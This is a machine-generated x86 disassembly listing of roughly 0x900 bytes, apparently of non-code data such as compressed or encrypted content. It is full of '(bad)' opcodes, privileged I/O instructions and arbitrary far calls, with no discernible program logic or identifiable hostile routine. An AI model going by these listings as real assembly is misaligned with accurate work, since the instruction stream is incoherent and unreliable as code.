  409a09:	stos   BYTE PTR es:[edi],al
  409a0a:	cmc    
  409a0b:	jmp    DWORD PTR [edx]
  409a0d:	sub    al,0x2
  409a0f:	call   0x368b45
  409a14:	fcomp  QWORD PTR [ecx+eiz*8]
  409a17:	test   DWORD PTR [esi+eiz*1-0x6c7395d5],0x7bcd5c7f
  409a22:	sub    esi,DWORD PTR [ebp-0xd4f9c4]
  409a28:	cmp    edx,DWORD PTR [eax-0x24d217fa]
  409a2e:	sub    bh,bh
  409a30:	adc    eax,0x23f73600
  409a35:	out    dx,al
  409a36:	cwde   
  409a37:	test   DWORD PTR [esi+ebp*8],ebp
  409a3a:	sub    bh,bh
  409a3c:	mov    esp,0x4d5c7153
  409a41:	jnp    0x409a6e
  409a43:	mov    ch,0xfc
  409a45:	lds    ebp,FWORD PTR [edx]
  409a47:	(bad)  
  409a48:	sti    
  409a49:	(bad)  
  409a4a:	aas    
  409a4b:	dec    eax
  409a4c:	dec    ebp
  409a4d:	jnp    0x409a71
  409a4f:	mov    esi,0xb2ab62c
  409a54:	int3   
  409a55:	es cmc 
  409a57:	sbb    BYTE PTR [ecx],0x9b
  409a5a:	adc    bh,bh
  409a5c:	shl    DWORD PTR [esi-0x6f],cl
  409a5f:	sldt   WORD PTR [eax]
	...
  409a72:	add    BYTE PTR [eax],al
  409a74:	retf   
  409a75:	dec    edx
  409a76:	fwait
  409a77:	test   esp,esp
  409a79:	test   DWORD PTR [eax],ebp
  409a7b:	call   FWORD PTR [ebx+edx*4-0x7a]
  409a7f:	popf   
  409a80:	mov    bl,0x7d
  409a82:	and    al,0x14
  409a84:	xchg   edi,eax
  409a85:	cmp    edx,DWORD PTR [ecx-0x579cc3fb]
  409a8b:	pushf  
  409a8c:	fwait
  409a8d:	gs inc eax
  409a8f:	test   DWORD PTR [ebp+eiz*2+0x7da1ff28],esi
  409a96:	or     al,BYTE PTR [eax]
  409a98:	adc    ecx,esi
  409a9a:	cmp    al,0xf7
  409a9c:	jnp    0x409ae1
  409a9e:	mov    ebp,0xc99a2c67
  409aa3:	jmp    FWORD PTR [edx-0x6b]
  409aa6:	push   esp
  409aa7:	adc    al,0x5b
  409aa9:	mov    WORD PTR [edi-0x78671edf],ss
  409aaf:	xchg   ebp,eax
  409ab0:	repz mov eax,DWORD PTR [edi+0x7761118b]
  409ab7:	and    DWORD PTR [ebx+0x18],eax
  409aba:	xor    eax,0x7f8c4328
  409abf:	add    al,0x83
  409ac1:	adc    BYTE PTR [ebx+0x4],bl
  409ac4:	mov    WORD PTR [edx+eiz*2+0x5784305f],ss
  409acb:	and    DWORD PTR [ebx+ebx*4-0x6b736d9d],ecx
  409ad2:	fild   WORD PTR [ecx+ecx*2+0x21377d]
	...
  409ae9:	add    BYTE PTR [eax],al
  409aeb:	add    BYTE PTR [ebx],al
  409aed:	xchg   ebp,eax
  409aee:	out    0x87,al
  409af0:	or     eax,0x6403df95
  409af5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409af6:	fbstp  TBYTE PTR [eax]
  409af8:	sub    cl,BYTE PTR [ebp+edx*4-0x76990bf5]
  409aff:	and    ebx,ebx
  409b01:	mov    edx,DWORD PTR [ebp+0x30]
  409b04:	fisttp DWORD PTR [ebx-0x63bedef9]
  409b0a:	pop    ss
  409b0b:	jmp    0x7d01:0x20f78c25
  409b12:	mul    DWORD PTR [eax]
  409b14:	mov    bl,0x8b
  409b16:	jge    0x409b23
  409b18:	mov    ah,0xac
  409b1a:	mov    DWORD PTR [eax],esp
  409b1c:	mov    ds:0xa3279d8b,eax
  409b21:	mov    ebx,edi
  409b23:	and    BYTE PTR [ecx],bl
  409b25:	pushf  
  409b26:	(bad)  
  409b27:	or     eax,0x20cf8b26
  409b2c:	cmp    DWORD PTR [edi+edi*4+0x20],ebp
  409b30:	jnp    0x409abd
  409b32:	or     DWORD PTR [eax+eax*4],edi
  409b35:	jl     0x409aca
  409b37:	push   eax
  409b38:	lods   al,BYTE PTR ds:[esi]
  409b39:	mov    esi,esi
  409b3b:	pop    esp
  409b3c:	mov    ds:0xac9ef683,eax
  409b41:	add    DWORD PTR [ecx],eax
  409b43:	sbb    DWORD PTR [ebp+0x108ef62d],0x6c7edd49
  409b4d:	mov    ecx,DWORD PTR [ecx]
  409b4f:	cmc    
	...
  409b64:	cmp    BYTE PTR [esi],dl
  409b66:	mov    ah,0x99
  409b68:	xchg   esp,eax
  409b69:	mov    esi,esi
  409b6b:	in     eax,0x2
  409b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b6e:	sub    DWORD PTR [ebx+ebx*2-0x7d],0xc46c5ef6
  409b76:	cmc    
  409b77:	fadd   QWORD PTR [edi-0x538f9c84]
  409b7d:	mov    esp,edx
  409b7f:	repz xor DWORD PTR [ebx+0x7c87b4f7],ecx
  409b86:	push   edi
  409b87:	push   eax
  409b88:	lods   al,BYTE PTR ds:[esi]
  409b89:	mov    esi,esi
  409b8b:	je     0x409b40
  409b8d:	xor    esi,0x26
  409b90:	mov    bh,0x36
  409b92:	xchg   ebp,eax
  409b93:	push   ds
  409b94:	lods   al,BYTE PTR ds:[esi]
  409b95:	mov    edi,DWORD PTR [ebp+eax*1+0x1f68b74]
  409b9c:	inc    esp
  409b9d:	sub    dh,dh
  409b9f:	push   es
  409ba0:	ins    BYTE PTR es:[edi],dx
  409ba1:	inc    ecx
  409ba2:	loope  0x409b9a
  409ba4:	fwait
  409ba5:	mov    esp,ecx
  409ba7:	xor    ecx,DWORD PTR gs:[ebx+0x6841eef6]
  409bae:	(bad)  
  409baf:	out    0x83,al
  409bb1:	jl     0x409b3b
  409bb3:	jge    0x409c30
  409bb5:	mov    esi,esi
  409bb7:	pushf  
  409bb8:	push   esp
  409bb9:	xor    esi,0xffffffce
  409bbc:	mov    eax,0x4a009502
  409bc1:	stos   BYTE PTR es:[edi],al
  409bc2:	cmc    
  409bc3:	mov    ch,0x35
  409bc5:	mov    ds:0xfff5,al
	...
  409bda:	add    BYTE PTR [eax],al
  409bdc:	cmp    ch,BYTE PTR [edx+eax*1]
  409bdf:	jmp    DWORD PTR [eax+0x28b9e098]
  409be5:	stos   BYTE PTR es:[edi],al
  409be6:	cmc    
  409be7:	inc    eax
  409be9:	mov    al,ds:0xb8fafffd
  409bee:	push   edx
  409bef:	pushf  
  409bf0:	sbb    ch,BYTE PTR [edx-0x47f2ba0b]
  409bf6:	ret    
  409bf7:	std    
  409bf8:	mov    edx,0xb975f5a9
  409bfd:	mov    eax,0x9635887e
  409c02:	mov    edi,0x5b9619c2
  409c07:	mov    ecx,ecx
  409c09:	adc    eax,0x964ffccd
  409c0e:	bound  ebx,QWORD PTR [edx+ebx*2]
  409c11:	sub    ecx,DWORD PTR [esi]
  409c13:	call   0x36a4f1
  409c18:	jl     0x409c75
  409c1a:	repnz push 0x49550e
  409c20:	mov    edx,0x3448db6b
  409c25:	xchg   esi,eax
  409c26:	cmc    
  409c27:	jne    0x409c06
  409c29:	mov    ebp,0xa97afd7a
  409c2e:	pusha  
  409c2f:	stos   DWORD PTR es:[edi],eax
  409c30:	stc    
  409c31:	push   eax
  409c32:	mul    BYTE PTR [edi-0x49]
  409c35:	xchg   ebp,eax
  409c36:	or     BYTE PTR [eax-0x17f1d346],al
  409c3c:	add    eax,0xfff5b5
	...
  409c51:	add    BYTE PTR [eax],al
  409c53:	add    BYTE PTR [edx+0x40fff22c],bh
  409c59:	cwde   
  409c5a:	loopne 0x409cdb
  409c5c:	or     al,0xab
  409c5e:	cmc    
  409c5f:	leave  
  409c60:	mov    WORD PTR ds:0xf6e1000e,?
  409c66:	and    eax,0x14474881
  409c6b:	(bad)  
  409c6c:	jnp    0x409c53
  409c6e:	or     al,0x6a
  409c70:	xchg   ecx,eax
  409c71:	inc    edx
  409c72:	xchg   ecx,eax
  409c73:	pop    es
  409c74:	je     0x409c11
  409c76:	jae    0x409c77
  409c78:	arpl   WORD PTR [ecx+eax*8],ax
  409c7b:	sti    
  409c7c:	in     al,0x6f
  409c7e:	or     eax,0x80f08c00
  409c83:	test   DWORD PTR [edx+0x1a],0x89345017
  409c8a:	pop    DWORD PTR [eax]
  409c8c:	mov    WORD PTR [esi+0x4060744a],es
  409c92:	push   cs
  409c93:	add    DWORD PTR [ebx+edi*2-0x414bdb61],ecx
  409c9a:	mov    ch,0x40
  409c9c:	mov    eax,?
  409c9e:	xor    bh,0x12
  409ca1:	loop   0x409cb9
  409ca3:	push   eax
  409ca4:	hlt    
  409ca5:	inc    ecx
  409ca6:	ja     0x409ca7
  409ca8:	add    ebp,DWORD PTR [ebx]
  409caa:	mov    ds:0x53d9fbff,al
  409caf:	push   eax
  409cb0:	repz inc edi
  409cb2:	add    ch,al
  409cb4:	and    bh,BYTE PTR [esi+edx*1+0xff]
	...
  409ccb:	add    ah,dh
  409ccd:	(bad)  
  409cce:	jb     0x409ccf
  409cd0:	fld    TBYTE PTR [ecx+0x27d3fb90]
  409cd6:	add    ch,al
  409cd8:	mov    ds:0xd5ff1704,eax
  409cdd:	mov    esp,0x661000d
  409ce2:	es or  eax,0x7e
  409ce6:	mov    eax,ds:0x175935ff
  409ceb:	jne    0x409c81
  409ced:	xchg   esp,eax
  409cee:	xlat   BYTE PTR ds:[ebx]
  409cef:	pop    ecx
  409cf0:	hlt    
  409cf1:	mov    bh,dl
  409cf3:	mov    ecx,DWORD PTR [ecx-0x78]
  409cf6:	dec    eax
  409cf7:	add    al,0x8c
  409cf9:	ja     0x409c81
  409cfb:	lods   al,BYTE PTR ds:[esi]
  409cfc:	pop    esp
  409cfd:	jmp    0x6a24a122
  409d02:	adc    al,0xc3
  409d04:	jae    0x409c8d
  409d06:	xor    eax,0xac2f740c
  409d0b:	sbb    eax,0x20158863
  409d10:	pop    ebx
  409d11:	add    bh,al
  409d13:	sub    esi,DWORD PTR [eax]
  409d15:	sub    eax,0x53551d9f
  409d1a:	in     al,dx
  409d1b:	add    ebx,ecx
  409d1d:	sbb    ebx,DWORD PTR [ebx+eax*4+0x1d7f6150]
  409d24:	xor    ebx,DWORD PTR [edx]
  409d26:	and    eax,0xfd87bc20
  409d2b:	repz and al,BYTE PTR [edx]
  409d2e:	cld    
  409d2f:	sub    eax,DWORD PTR [eax]
	...
  409d41:	add    BYTE PTR [eax],al
  409d43:	add    BYTE PTR [eax-0x78fc1ff1],ah
  409d49:	push   esp
  409d4a:	out    dx,eax
  409d4b:	xchg   BYTE PTR [eax],al
  409d4d:	xchg   esi,eax
  409d4e:	fild   WORD PTR [ebx]
  409d50:	retf   
  409d51:	rol    DWORD PTR [edi+0x4],1
  409d54:	mov    WORD PTR [edi+ebx*8+0x3f804944],ss
  409d5b:	add    eax,0x3c9948c
  409d60:	jbe    0x409cf6
  409d62:	cdq    
  409d63:	add    esp,DWORD PTR [esi-0x6c]
  409d66:	fs (bad) 
  409d68:	(bad)  
  409d6a:	ins    BYTE PTR es:[edi],dx
  409d6b:	xchg   eax,eax
  409d6d:	jg     0x409d76
  409d6f:	sbb    eax,0x1b75875c
  409d74:	mov    ebx,0x4a2bf401
  409d79:	wbinvd 
  409d7b:	jmp    0x7609390f
  409d80:	mov    bh,BYTE PTR [ebp-0x42]
  409d83:	call   0x8ea13217
  409d88:	(bad)  
  409d89:	aam    0x8
  409d8b:	(bad)  
  409d8c:	and    dl,BYTE PTR [edi-0x77fe8920]
  409d92:	neg    BYTE PTR [ecx]
  409d94:	add    eax,0x9b648464
  409d99:	jg     0x409d91
  409d9b:	mov    dh,0x1f
  409d9d:	in     eax,0xe0
  409d9f:	data16 loope 0x409d29
  409da2:	div    BYTE PTR [eax+0x12]
  409da5:	test   dh,bh
  409da7:	sahf   
	...
  409dbc:	jo     0x409e3a
  409dbe:	aam    0x73
  409dc0:	test   al,0x87
  409dc2:	test   BYTE PTR [edi+ebp*2+0x7f],ah
  409dc6:	test   BYTE PTR [esi+0x1dedeeff],0x4f
  409dcd:	xchg   edi,esi
  409dcf:	cmp    al,0x7f
  409dd1:	jg     0x409dc9
  409dd3:	outs   dx,BYTE PTR ds:[esi]
  409dd4:	add    BYTE PTR [ecx],0x5
  409dd7:	push   ecx
  409dd8:	push   esp
  409dd9:	sub    esi,esi
  409ddb:	pop    esi
  409ddc:	push   es
  409ddd:	adc    ebp,ebp
  409ddf:	pop    esi
  409de0:	test   al,0x87
  409de2:	arpl   cx,bp
  409de4:	aaa    
  409de5:	ja     0x409e3c
  409de7:	test   al,0x8f
  409de9:	xchg   DWORD PTR [ecx+edi*1+0x36f68798],edi
  409df0:	add    bl,BYTE PTR [ebx-0x789dd620]
  409df6:	div    BYTE PTR [eax+0x12]
  409df9:	js     0x409df9
  409dfb:	push   ds
  409dfc:	jo     0x409df8
  409dfe:	or     BYTE PTR [ecx-0x16b8175d],al
  409e04:	mov    al,ds:0xba00f941
  409e09:	stos   BYTE PTR es:[edi],al
  409e0a:	cmc    
  409e0b:	(bad)  
  409e0c:	cmp    BYTE PTR [edi-0x57bf5a20],dl
  409e12:	cmc    
  409e13:	mov    DWORD PTR [eax],ebp
  409e15:	mov    ebx,0x35b2fffd
  409e1a:	mul    BYTE PTR [edi-0x50]
  409e1d:	dec    ebx
  409e1e:	dec    ecx
	...
  409e33:	add    BYTE PTR [edx-0x1c],ah
  409e36:	clc    
  409e37:	not    DWORD PTR [edx-0x56]
  409e3a:	cmc    
  409e3b:	jne    0x409dbe
  409e3d:	mov    edx,0xaa329d82
  409e42:	jg     0x409dc9
  409e44:	add    DWORD PTR [edx-0x6f30000b],esp
  409e4a:	pusha  
  409e4b:	or     edx,eax
  409e4d:	dec    edi
  409e4e:	idiv   dh
  409e50:	mov    eax,0x22fffda0
  409e55:	stos   BYTE PTR es:[edi],al
  409e56:	jnp    0x409e64
  409e58:	or     eax,0x12ff953a
  409e5d:	sbb    BYTE PTR [eax+ebx*8+0x6af5a9ba],cl
  409e64:	xor    eax,0x745d4f3a
  409e69:	nop
  409e6a:	cmc    
  409e6b:	mov    ch,0xb5
  409e6d:	mov    eax,ds:0x23b2fff5
  409e72:	add    ch,al
  409e74:	dec    ecx
  409e75:	or     eax,0x136cfff6
  409e7a:	(bad)  
  409e7c:	push   edx
  409e7d:	test   eax,0xa149bd89
  409e82:	cmc    
  409e83:	push   ebp
  409e85:	adc    eax,0xbc708371
  409e8a:	std    
  409e8b:	push   DWORD PTR [edx+0x66707c90]
  409e91:	jmp    0x409e73
  409e93:	test   DWORD PTR [esi+ebx*4+0x11],0x0
	...
  409eaa:	add    BYTE PTR [eax],al
  409eac:	cmp    BYTE PTR [esi],cl
  409eae:	mov    ds:0x529e8c0f,al
  409eb3:	(bad)  
  409eb4:	cmp    DWORD PTR [ebx+0x7f02bf22],eax
  409eba:	adc    edi,edi
  409ebc:	fld    DWORD PTR [edi+0x6e9bff1b]
  409ec2:	cdq    
  409ec3:	pop    es
  409ec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ec5:	mov    bh,BYTE PTR [ebx-0x1]
  409ec8:	mov    ebx,DWORD PTR [esi+0x59]
  409ecb:	call   0xff53f54b
  409ed0:	add    DWORD PTR [edx+eiz*1+0x13461b05],eax
  409ed7:	jmp    DWORD PTR [ecx]
  409ed9:	pop    ebx
  409eda:	sbb    edi,edi
  409edc:	arpl   WORD PTR [esi],si
  409ede:	pop    ecx
  409edf:	in     al,0x63
  409ee1:	cs adc edi,edi
  409ee4:	fld    DWORD PTR [ebx+0x1e22c522]
  409eea:	adc    edi,edi
  409eec:	stc    
  409eed:	inc    edx
  409eee:	sbb    edi,edi
  409ef0:	cmp    ecx,DWORD PTR [esi]
  409ef2:	cdq    
  409ef3:	pop    es
  409ef4:	and    al,0x1a
  409ef6:	js     0x409ef7
  409ef8:	sub    edi,esi
  409efa:	pop    eax
  409efb:	fcomp  QWORD PTR [ebx]
  409efd:	not    BYTE PTR [edx]
  409eff:	jmp    DWORD PTR [ecx-0x52add7d]
  409f05:	in     eax,0x12
  409f07:	inc    DWORD PTR [ecx-0x39]
  409f0a:	sbb    bh,bh
  409f0c:	add    edx,esi
  409f0e:	cwde   
  409f0f:	pop    es
	...
  409f24:	in     al,0xb5
  409f26:	ja     0x409f27
  409f28:	repz lds ebx,FWORD PTR [eax-0x1c]
  409f2c:	jecxz  0x409eeb
  409f2e:	adc    ch,al
  409f30:	xor    eax,0xdbff12e4
  409f35:	xchg   ebx,eax
  409f36:	push   esp
  409f37:	daa    
  409f38:	fild   DWORD PTR [edi+edx*1+0x1f2b2a2b]
  409f3f:	sbb    al,bl
  409f41:	or     BYTE PTR ds:[edx],dl
  409f44:	mov    ebx,0x15761884
  409f49:	test   edi,esi
  409f4b:	sbb    ecx,esp
  409f4d:	neg    DWORD PTR [bx+di]
  409f50:	mov    ds:0x9b7c687b,eax
  409f55:	test   bh,ch
  409f57:	dec    edi
  409f58:	mov    ah,0x7c
  409f5a:	xlat   BYTE PTR ds:[ebx]
  409f5b:	sbb    DWORD PTR [edx+eax*1+0x79],esi
  409f5f:	sbb    DWORD PTR [ebx-0x7ccf627c],eax
  409f65:	test   bh,cl
  409f67:	sub    al,0xfe
  409f69:	sbb    eax,0x4a6b19b7
  409f6e:	mov    al,0x11
  409f70:	arpl   WORD PTR [edi+eiz*4+0x1583878f],ax
  409f77:	or     al,0x64
  409f79:	pushf  
  409f7a:	xchg   ebp,eax
  409f7b:	sbb    DWORD PTR [ebx-0x7c],ecx
  409f7e:	push   ebp
  409f7f:	adc    al,0x3b
  409f81:	test   BYTE PTR [edi-0x70e21dd4],al
  409f87:	sbb    DWORD PTR [eax],eax
	...
  409f99:	add    BYTE PTR [eax],al
  409f9b:	add    BYTE PTR [ebx],dh
  409f9d:	fiadd  DWORD PTR [edi+0x7f82872b]
  409fa3:	sbb    DWORD PTR [ebx],esp
  409fa5:	or     ah,BYTE PTR [esp+ebp*1-0x62]
  409fa9:	sbb    eax,esp
  409fab:	add    eax,DWORD PTR [ebp+0x57]
  409fae:	in     al,0x3
  409fb0:	popa   
  409fb1:	cmovl  eax,DWORD PTR [ebp+0x3ca80c8]
  409fb8:	mov    ds:0x6c8b8f4e,ax
  409fbe:	fdiv   DWORD PTR [ecx-0x15]
  409fc1:	or     DWORD PTR [ecx],0x60
  409fc4:	and    eax,DWORD PTR [eax-0x2add269f]
  409fca:	or     BYTE PTR [esi],ah
  409fcc:	ret    
  409fcd:	inc    cx
  409fcf:	test   al,0x8f
  409fd1:	cmp    DWORD PTR [ecx+eiz*8+0x77],0x54
  409fd6:	hlt    
  409fd7:	push   cs
  409fd8:	xchg   ebp,eax
  409fd9:	in     al,dx
  409fda:	sbb    BYTE PTR [esi+ecx*8-0x7014917d],ah
  409fe1:	xchg   esp,eax
  409fe2:	mov    dh,dh
  409fe4:	adc    bl,BYTE PTR [eax+eiz*8-0x97c7cc1]
  409feb:	out    0x2,al
  409fed:	xor    dh,0x54
  409ff0:	cwde   
  409ff1:	ins    BYTE PTR es:[edi],dx
  409ff2:	jb     0x40a073
  409ff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ff5:	add    eax,0xffffffab
  409ff8:	jnp    0x409f7d
  409ffa:	pop    ebp
  409ffb:	jb     0x409fa8
  409ffd:	pop    ss
  409ffe:	int    0xbd
	...
  40a014:	sbb    eax,0x31e962ea
  40a019:	mov    ds:0x6c8834f5,eax
  40a01e:	adc    al,0x7f
  40a020:	je     0x409fa5
  40a022:	and    BYTE PTR [esp+eiz*4],0xf
  40a026:	cmp    al,0x3e
  40a028:	push   eax
  40a029:	aam    0x8
  40a02b:	bound  esp,QWORD PTR [edx-0x22]
  40a02e:	inc    eax
  40a02f:	sub    BYTE PTR [eax+0x1be93614],cl
  40a035:	hlt    
  40a036:	pusha  
  40a037:	pop    ss
  40a038:	fcmovnbe st,st(3)
  40a03a:	or     BYTE PTR [edi],dl
  40a03c:	push   0x8fe98bbe
  40a041:	in     al,0x60
  40a043:	mov    ebx,0xbe08d442
  40a048:	mov    bh,0xb2
  40a04a:	mov    ebp,ecx
  40a04c:	(bad)  
  40a04d:	fiadd  WORD PTR [ecx]
  40a04f:	add    BYTE PTR [ebp-0x78f4f5ee],ah
  40a055:	adc    esp,DWORD PTR [eax]
  40a057:	push   esi
  40a058:	dec    ebp
  40a059:	sub    ch,BYTE PTR [eax+0x602faaff]
  40a05f:	pop    ebp
  40a060:	and    al,0x97
  40a062:	pop    eax
  40a063:	call   0x36abae
  40a068:	add    eax,0xbafff62f
  40a06d:	(bad)  [eax+0x65]
  40a070:	call   0xaa9096ca
  40a075:	adc    BYTE PTR [esi],cl
  40a077:	call   0x40a07c
	...
  40a08c:	sbb    edx,esi
  40a08e:	cmc    
  40a08f:	dec    DWORD PTR [ebp-0x55006eec]
  40a095:	scas   al,BYTE PTR es:[edi]
  40a096:	pop    es
  40a097:	inc    esi
  40a098:	cmc    
  40a099:	push   0xfffffff6
  40a09b:	je     0x40a0fc
  40a09d:	inc    ebx
  40a09e:	repnz xor esp,DWORD PTR ds:0x4afff5e0
  40a0a5:	stos   BYTE PTR es:[edi],al
  40a0a6:	cli    
  40a0a7:	scas   al,BYTE PTR es:[edi]
  40a0a8:	lea    eax,[ecx+0x241a9f7d]
  40a0ae:	bnd jmp DWORD PTR [eax-0x2f1c1f70]
  40a0b5:	test   eax,0xcf8b5ff5
  40a0ba:	retf   0x3504
  40a0bd:	inc    ebp
  40a0be:	sub    esp,0xffffffa6
  40a0c1:	aam    0xf4
  40a0c3:	push   DWORD PTR [eax]
  40a0c5:	call   0x92f2:0xae1d75f5
  40a0cc:	call   0x7ba9:0xa9457fa9
  40a0d3:	cld    
  40a0d4:	stos   BYTE PTR es:[edi],al
  40a0d5:	and    ecx,DWORD PTR [esi]
  40a0d7:	call   0x36a6ab
  40a0dc:	mov    esi,?
  40a0de:	mov    edi,0x98ab870b
  40a0e3:	inc    ecx
  40a0e4:	setne  BYTE PTR [esp+esi*2]
  40a0e8:	test   eax,0xf4fb97c2
  40a0ed:	cs jb  0x40a0ef
	...
  40a104:	fistp  DWORD PTR [ebx]
  40a106:	pop    ds
  40a107:	jne    0x40a089
  40a109:	mov    edx,0xa25cfb97
  40a10e:	xchg   edi,eax
  40a10f:	pop    es
  40a110:	mov    ah,0xcd
  40a112:	jp     0x40a113
  40a114:	mov    ebx,0x804d8345
  40a119:	out    dx,al
  40a11a:	sar    edi,cl
  40a11c:	and    BYTE PTR [ebp-0x1c6e1848],al
  40a122:	sbb    eax,0x21ab67ff
  40a127:	adc    al,0xf
  40a129:	stc    
  40a12a:	cld    
  40a12b:	(bad)  
  40a12c:	inc    DWORD PTR [ebx+0x6a9c4583]
  40a132:	cdq    
  40a133:	sti    
  40a134:	or     ebp,DWORD PTR [ebx-0x7d]
  40a137:	ret    0x6d67
  40a13a:	jecxz  0x40a0fb
  40a13c:	push   ebp
  40a13d:	sub    eax,0xf6b9000e
  40a142:	sub    eax,0x1f5fe1ff
  40a147:	jne    0x40a0cd
  40a149:	and    ecx,DWORD PTR [edi+0x1f224b92]
  40a14f:	jne    0x40a0e1
  40a151:	mov    ebx,0x1384751d
  40a156:	not    DWORD PTR [edx-0x3dbae5cd]
  40a15c:	xchg   esp,eax
  40a15d:	imul   edi,DWORD PTR [ecx+0x35ee308a],0xffffffc0
  40a164:	ret    0xb9aa
  40a167:	add    BYTE PTR [eax],0x0
	...
  40a17a:	add    BYTE PTR [eax],al
  40a17c:	xchg   ecx,eax
  40a17d:	xchg   esp,eax
  40a17e:	test   DWORD PTR [ebx],0x9862a680
  40a184:	xchg   edi,eax
  40a185:	xchg   esp,eax
  40a186:	rol    DWORD PTR [edi],cl
  40a188:	ud0    ebp,edi
  40a18b:	add    edi,DWORD PTR [eax-0x66]
  40a18e:	bound  ebx,QWORD PTR [eax+0xcbc947f]
  40a194:	mov    bh,0x54
  40a196:	fwait
  40a197:	mov    dh,0x39
  40a199:	dec    ebx
  40a19a:	and    dh,bl
  40a19c:	ror    DWORD PTR ds:0x740f07a5,cl
  40a1a2:	out    dx,eax
  40a1a3:	add    BYTE PTR [ecx-0x70],0xdf
  40a1a7:	(bad)  
  40a1a8:	(bad)  
  40a1a9:	lea    ebx,[edi]
  40a1ab:	pop    DWORD PTR [ebp+ebp*4-0x1db545e1]
  40a1b2:	cmp    BYTE PTR [ecx+0x7c],al
  40a1b5:	xchg   esp,eax
  40a1b6:	push   0xffffffc0
  40a1b8:	jg     0x40a1cf
  40a1ba:	add    dh,bh
  40a1bc:	push   cs
  40a1bd:	push   ebx
  40a1bf:	add    eax,DWORD PTR [eax]
  40a1c1:	cdq    
  40a1c2:	cli    
  40a1c3:	inc    ebx
  40a1c4:	clc    
  40a1c5:	lea    ecx,[edx]
  40a1c7:	inc    esp
  40a1c8:	xlat   BYTE PTR ds:[ebx]
  40a1c9:	fbld   TBYTE PTR ds:0xdfa54e4b
  40a1cf:	call   0x87e221a
  40a1d4:	adc    ebx,edx
  40a1d6:	lahf   
  40a1d7:	adc    ecx,0xd914eb54
  40a1dd:	push   esp
  40a1de:	cwde   
  40a1df:	call   0x0:0x0
	...
  40a1f2:	add    BYTE PTR [eax],al
  40a1f4:	and    al,BYTE PTR [eax-0x25eae769]
  40a1fa:	mov    ds:0x4658b989,eax
  40a1ff:	nop
  40a200:	rcl    ch,1
  40a202:	fistp  WORD PTR [edx-0x69]
  40a205:	xchg   esp,eax
  40a206:	fild   WORD PTR [ebx]
  40a208:	pop    ds
  40a209:	cmp    DWORD PTR [ecx],ecx
  40a20b:	bound  ecx,QWORD PTR [ebx]
  40a20d:	cwde   
  40a20e:	sbb    DWORD PTR [esp+eax*4],0x4b74ad83
  40a215:	jo     0x40a270
  40a217:	pop    esi
  40a218:	adc    eax,DWORD PTR [eax-0xa]
  40a21b:	fdivr  QWORD PTR [ebx-0x66778194]
  40a221:	jg     0x40a219
  40a223:	mov    esp,0x56386cab
  40a228:	jns    0x40a2a9
  40a22a:	idiv   BYTE PTR [ebx+edx*4+0xd294c0f]
  40a231:	fcmove st,st(0)
  40a233:	add    ah,BYTE PTR [ecx-0x2dee36f7]
  40a239:	not    BYTE PTR es:[esi]
  40a23c:	pop    es
  40a23d:	fcmove st,st(4)
  40a23f:	or     eax,0x74ccda07
  40a244:	sbb    esi,DWORD PTR [eax-0x7e]
  40a247:	jl     0x40a2ac
  40a249:	cmp    eax,0x948fe919
  40a24e:	stc    
  40a24f:	inc    ebp
  40a250:	cmp    cl,BYTE PTR [eax]
  40a252:	push   esp
  40a253:	sub    BYTE PTR [eax+0xe9023d],dl
	...
  40a269:	add    BYTE PTR [eax],al
  40a26b:	add    BYTE PTR [edi+0x48df994],cl
  40a271:	or     DWORD PTR [ecx],eax
  40a273:	bound  ecx,QWORD PTR [edx-0x75]
  40a276:	stc    
  40a277:	lea    edx,[edx]
  40a279:	fld1   
  40a27b:	sbb    DWORD PTR [ecx+0x9],edi
  40a27e:	leave  
  40a27f:	mov    dh,0xa
  40a281:	push   ebx
  40a282:	loope  0x40a28b
  40a284:	out    dx,eax
  40a285:	jg     0x40a27d
  40a287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a288:	sbb    dl,BYTE PTR [ebx-0x1f]
  40a28b:	mov    DWORD PTR [ecx+0x1295f67f],esi
  40a291:	or     ecx,edi
  40a293:	pop    esp
  40a294:	sbb    dl,BYTE PTR [edi-0x50]
  40a297:	add    BYTE PTR [ebp-0x6d],al
  40a29a:	or     BYTE PTR [eax],al
  40a29c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a29d:	fild   WORD PTR [ebx+0xda0575]
  40a2a3:	add    BYTE PTR ds:0xdfa4f993,ah
  40a2a9:	xchg   ecx,eax
  40a2aa:	add    DWORD PTR [ebp-0x43],0x43
  40a2ae:	out    dx,al
  40a2af:	push   0x8b089307
  40a2b4:	fadd   DWORD PTR [edx-0x2e36827d]
  40a2ba:	in     eax,0x3
  40a2bc:	fisub  WORD PTR [edi-0x67b19884]
  40a2c2:	add    DWORD PTR [ebp+0x4d],0x43
  40a2c6:	pop    esp
  40a2c7:	push   esi
  40a2c8:	popf   
  40a2c9:	call   0x8cf:0x13b500ac
	...
  40a2e4:	repnz mov esi,ebp
  40a2e7:	jne    0x40a299
  40a2e9:	xchg   edx,eax
  40a2ea:	mov    esi,0xf1149246
  40a2ef:	or     BYTE PTR [edx],bl
  40a2f1:	xchg   ebp,eax
  40a2f2:	and    eax,esi
  40a2f4:	into   
  40a2f5:	or     eax,0x2b93d106
  40a2fa:	imul   BYTE PTR [ecx+0x75]
  40a2fd:	and    dh,dh
  40a2ff:	imul   esi,DWORD PTR [ebp+0x3c],0x207575f7
  40a306:	imul   BYTE PTR [ecx+0x65]
  40a309:	call   0xc001:0x927581b6
  40a310:	cdq    
  40a311:	pop    edi
  40a312:	inc    esi
  40a313:	push   eax
  40a314:	dec    ebp
  40a315:	pop    ss
  40a316:	lahf   
  40a317:	jmp    DWORD PTR [edx]
  40a319:	(bad)  
  40a31a:	rcr    BYTE PTR [ecx-0x61],1
  40a31d:	cwde   
  40a31e:	bound  eax,QWORD PTR [eax]
  40a320:	test   BYTE PTR [ebp+0x5c],al
  40a323:	dec    DWORD PTR [eax+eiz*4-0x6e739604]
  40a32a:	or     al,0xe8
  40a32c:	or     ebp,ebp
  40a32e:	or     al,0x0
  40a330:	xchg   edi,eax
  40a331:	sub    edx,DWORD PTR [eax-0x49ec40f9]
  40a337:	xchg   ebp,eax
  40a338:	adc    ebp,edi
  40a33a:	aad    0xda
  40a33c:	pop    ss
  40a33d:	stos   DWORD PTR es:[edi],eax
  40a33e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a33f:	pop    esi
  40a340:	(bad)  
